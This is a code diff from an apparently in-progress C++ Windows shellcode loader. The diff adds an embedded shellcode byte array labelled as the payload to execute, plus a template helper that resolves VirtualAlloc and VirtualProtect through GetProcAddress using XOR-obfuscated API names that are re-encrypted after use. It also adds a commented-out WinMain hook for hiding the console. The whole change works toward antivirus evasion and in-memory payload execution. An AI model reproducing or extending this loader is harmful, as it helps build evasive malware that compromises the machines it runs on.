@@ -24,6 +24,11 @@ To Do
 */
 
 
+
+
+
+
+
 unsigned char shellcode[] = { //Payload we want to execute.
   0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
   0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
@@ -81,7 +86,6 @@ This issue only happens when CreateToolHelp32Snapshot, is provided in any way ot
 I could not replicate this issue with any of the other GetProcAddress calls.....What The Fuck????
 Its definitely somehow, my doing.  
 */
-
 
 
 
@@ -219,11 +223,28 @@ unsigned char* XOREncryptLPC(unsigned char* encoded, int sizeOfEncodedStr, char 
 
 //4) Base64 Decode
 
+template <typename pointerToFunc> pointerToFunc createFunction(unsigned char* parentModule,int parentModule_Length ,unsigned char* inputArray, int inputArray_Length, char* XORKey, int XORKey_Length)
+{
+	pointerToFunc pFunction  = (pointerToFunc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(parentModule, parentModule_Length, XORKey, XORKey_Length)), (LPCSTR)XORDecryptLPC(inputArray, inputArray_Length, XORKey, XORKey_Length));
+	XOREncryptLPC(parentModule, parentModule_Length, XORKey, XORKey_Length);
+	XOREncryptLPC(inputArray, inputArray_Length, XORKey, XORKey_Length);
+
+	if (pFunction == NULL)
+	{
+		printf("pFunction after template functionality is still a null ptr!!!!!!!!!!!!!!!!!! \n");
+		std::cout << "Template typename, involved in this error is: " << typeid(pointerToFunc).name() << "\n";
+
+	}
+
+	return pFunction;
+}
 
 
 
+//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd, int cmdShow)
 int main()
 {
+//	freeconsole();
 	bool isAllocated;
 	bool isExec;
 	//LPVOID pVirtualAlloc;
@@ -245,7 +266,7 @@ int main()
 
 
 	//Initializing function pointer values
-
+	/* Commented out for testing 8th jan for template
 		pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
 	if (pVirtualAlloc == NULL)
 	{
@@ -253,8 +274,8 @@ int main()
 	}
 	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
 	XOREncryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length); //reencrypt virAlloc string after our handle has been grabbed
-
-
+	*/
+	pVirtualAlloc = createFunction<functVirtualAlloc>(kernel, sizeof(kernel), virAlloc, sizeof(virAlloc), XORKey, XORKey_length);
 
 	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length)); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
 	if (pVirtualProtect == NULL)
